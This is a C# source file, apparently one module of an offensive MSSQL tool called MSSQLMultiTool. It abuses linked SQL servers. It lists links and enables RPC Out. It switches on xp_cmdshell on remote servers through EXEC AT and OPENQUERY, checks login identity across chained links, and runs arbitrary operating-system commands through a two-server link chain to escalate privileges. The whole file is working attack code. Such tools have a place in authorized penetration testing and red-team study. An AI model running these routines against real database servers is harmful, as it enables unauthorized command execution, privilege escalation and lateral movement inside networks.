using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;
using MSSQLMultiTool.outputsLib;


namespace MSSQLMultiTool.Modules
{
    class Links
    {
        static void checkArguments(Dictionary<string, string> arguments)
        {
            try
            {
                if (!arguments.ContainsKey("run"))
                {
                    outputs.printError("Missing Run Argument \n");
                    help();
                    Environment.Exit(0);
                }
            }
            catch (Exception e)
            {
                outputs.printError("Missing Run Argument \n");
                help();
                Environment.Exit(0);
            }
        }

        static void checkEnableRPCOut(SqlConnection con, Dictionary<string, string> arguments)
        {
            try
            {
                
                if (arguments.ContainsKey("enable-rpc-out"))
                {
                    outputs.printOutput($"Enabling RPC Out on {arguments["target"]}");
                    enableRPCOut(con, arguments["target"]);
                }
            }
            catch(Exception e)
            {
                outputs.printError(e.Message);
                return;
            }
        }


            public static void execute_xp_cmdshell(SqlConnection con, String cmd, String target)
        {
            String res = SQLModule.executeQuery($"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT \"{target}\";", con);
            outputs.printOutput($"Enabled advanced options on {target}.");
            res = SQLModule.executeQuery($"EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"{target}\";", con);
            outputs.printOutput($"Enabled xp_cmdshell option on {target}.");
            res = SQLModule.executeQuery($"EXEC ('xp_cmdshell ''{cmd}'';') AT \"{target}\";", con);
            outputs.printSuccess($"Triggered command. Result: {res}");
        }

        public static void execute_openquery_xp_cmdshell(SqlConnection con, String cmd, String target)
        {
            // Execute on linked server via 'openquery'
            String res = SQLModule.executeQuery($"select 1 from openquery(\"{target}\", 'select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure')", con);
            outputs.printOutput($"Enabled advanced options on {target}.");
            res = SQLModule.executeQuery($"select 1 from openquery(\"{target}\", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure')", con);
            outputs.printOutput($"Enabled xp_cmdshell options on {target}.");
            res = SQLModule.executeQuery($"select 1 from openquery(\"{target}\", 'select 1; exec xp_cmdshell ''{cmd}''')", con);
            outputs.printSuccess($"Triggered command. Result: {res}");
        }

        public static void enumerateLinkedServers(SqlConnection con)
        {
            // Enumerate linked servers
            String res = SQLModule.executeQuery("EXEC sp_linkedservers;", con);
            outputs.printSuccess($"Found linked servers: {res}");
        }

        public static void enableRPCOut(SqlConnection con,string target)
        {
            String res = SQLModule.executeQuery($"EXEC sp_serveroption '{target}', 'rpc out', 'true';", con);
            outputs.printSuccess($"Enabled RPC Out on {target}. {res}");
        }

        public static void check_for_privilege_escalation(SqlConnection con, String local_target, String remote_target)
        {
            String su = SQLModule.executeQuery("SELECT SYSTEM_USER;", con);
            // Escalate via double database linkedString su = executeQuery("SELECT SYSTEM_USER;", con);
            outputs.printOutput($"Current system user is '{su}' in current database.");
            su = SQLModule.executeQuery($"select mylogin from openquery(\"{remote_target}\", 'select SYSTEM_USER as mylogin');", con);
            outputs.printOutput($"Current system user is '{su}' in database '{remote_target}' via 1 link.");
            su = SQLModule.executeQuery($"select mylogin from openquery(\"{remote_target}\", 'select mylogin from openquery(\"{local_target}\", ''select SYSTEM_USER as mylogin'')');", con);
            outputs.printOutput($"Current system user is '{su}' in database '{local_target}' via 2 links.");
        }

        public static void privilege_escalation(SqlConnection con, String cmd, String local_target, String remote_target)
        {
            String res = SQLModule.executeQuery($"EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT {local_target}') AT {remote_target};", con);
            outputs.printOutput($"Configured advanced options");
            res = SQLModule.executeQuery($"EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'')  AT {local_target}') AT {remote_target};", con);
            outputs.printOutput($"enabled XP_CMDSHELL on {remote_target}");
            res = SQLModule.executeQuery($"EXEC ('EXEC (''xp_cmdshell ''''{cmd}'''';'')  AT {local_target}') AT {remote_target};", con);
            outputs.printSuccess($"Executed command on {local_target} Successfuly");
            outputs.printSuccess($"output: {res}");
        }
        static void ExecuteSubModule(Dictionary<string, string> arguments, SqlConnection con)
        {
            try
            {
                if (arguments["run"].Equals("xp_cmdshell"))
                {
                    try
                    {
                        if (!arguments.ContainsKey("target"))
                        {
                            outputs.printError("Missing Target Argument \n");
                            help();
                            Environment.Exit(0);
                        }
                    }
                    catch (Exception e)
                    {
                        outputs.printError("Missing Target Argument \n");
                        help();
                        Environment.Exit(0);
                    }
                    try
                    {
                        if (!arguments.ContainsKey("command"))
                        {
                            outputs.printError("Missing Command Argument \n");
                            help();
                            Environment.Exit(0);
                        }
                    }
                    catch (Exception e)
                    {
                        outputs.printError("Missing Command Argument \n");
                        help();
                        Environment.Exit(0);
                    }
                    execute_xp_cmdshell(con, arguments["command"], arguments["target"]);                
                }
                else if (arguments["run"].Equals("open_query"))
                {
                    try
                    {
                        if (!arguments.ContainsKey("target"))
                        {
                            outputs.printError("Missing Target Argument \n");
                            help();
                            Environment.Exit(0);
                        }
                    }
                    catch (Exception e)
                    {
                        outputs.printError("Missing Target Argument \n");
                        help();
                        Environment.Exit(0);
                    }
                    try
                    {
                        if (!arguments.ContainsKey("command"))
                        {
                            outputs.printError("Missing Command Argument \n");
                            help();
                            Environment.Exit(0);
                        }
                    }
                    catch (Exception e)
                    {
                        outputs.printError("Missing Command Argument \n");
                        help();
                        Environment.Exit(0);
                    }
                    execute_openquery_xp_cmdshell(con, arguments["command"], arguments["target"]);
                }
                else if (arguments["run"].Equals("enum_servers"))
                {
                    enumerateLinkedServers(con);
                }
                else if (arguments["run"].Equals("check_privilege_escalation"))
                {
                    try
                    {
                        if (!arguments.ContainsKey("target"))
                        {
                            outputs.printError("Missing Target Argument \n");
                            help();
                            Environment.Exit(0);
                        }
                    }
                    catch (Exception e)
                    {
                        outputs.printError("Missing Target Argument \n");
                        help();
                        Environment.Exit(0);
                    }
                    check_for_privilege_escalation(con, arguments["instance"], arguments["target"]);
                }
                else if (arguments["run"].Equals("privilege_escalation"))
                {
                    try
                    {
                        if (!arguments.ContainsKey("target"))
                        {
                            outputs.printError("Missing Target Argument \n");
                            help();
                            Environment.Exit(0);
                        }
                    }
                    catch (Exception e)
                    {
                        outputs.printError("Missing Target Argument \n");
                        help();
                        Environment.Exit(0);
                    }
                    try
                    {
                        if (!arguments.ContainsKey("command"))
                        {
                            outputs.printError("Missing Command Argument \n");
                            help();
                            Environment.Exit(0);
                        }
                    }
                    catch (Exception e)
                    {
                        outputs.printError("Missing Command Argument \n");
                        help();
                        Environment.Exit(0);
                    }
                    privilege_escalation(con, arguments["command"], arguments["instance"], arguments["target"]);
                }
                else
                {
                    outputs.printError($"Unknown Sub Module Argument: {arguments["run"]} \n");
                    help();
                    Environment.Exit(0);
                }
            }
            catch (Exception e)
            {
                outputs.printError(e.Message + "\n");
                help();
                Environment.Exit(0);
            }
        }
        public static void help()
        {
            Console.WriteLine("--module links\n");
            Console.WriteLine("     Arguments:\n");
            Console.WriteLine("     --instance <Local Connected Server>\n");
            Console.WriteLine("     --target <Remote Linked Server>\n");
            Console.WriteLine("     --run <sub module to run>\n");
            Console.WriteLine("         Sub Modules:\n");
            Console.WriteLine("         enum_servers :               Enumerate Links\n");
            Console.WriteLine("         xp_cmdshell                  : Executes XP_CMDSHELL\n");
            Console.WriteLine("         open_query                   : Executes  OpenQuery Command\n");
            Console.WriteLine("         check_privilege_escalation   : Check for Privilege Escalation via linked server\n");
            Console.WriteLine("         privilege_escalation         : Escalate privileges through impersonation from linked server\n");
            Console.WriteLine("     --command        : CMD Command to Execute\n");
            Console.WriteLine("     Switches:\n");
            Console.WriteLine("     --enable-rpc-out : Enables RPC Out on remote server\n");
        }
        public static void run(Dictionary<string, string> arguments, SqlConnection con)
        {
            outputs.printHeader("Loading Links Module");

            checkArguments(arguments);

            checkEnableRPCOut(con,arguments);

            ExecuteSubModule(arguments,con);
        }
    }
}
